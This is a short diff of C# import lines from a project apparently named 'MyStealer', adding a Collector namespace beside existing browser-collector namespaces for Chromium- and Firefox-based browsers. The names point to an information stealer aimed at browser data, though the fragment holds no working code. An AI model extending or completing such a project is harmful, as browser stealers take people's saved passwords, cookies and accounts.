@@ -1,4 +1,5 @@
-﻿using MyStealer.Collector.Browser;
+﻿using MyStealer.Collector;
+using MyStealer.Collector.Browser;
 using MyStealer.Collector.Browser.ChromiumBased;
 using MyStealer.Collector.Browser.FirefoxBased;
 using MyStealer.Shared;
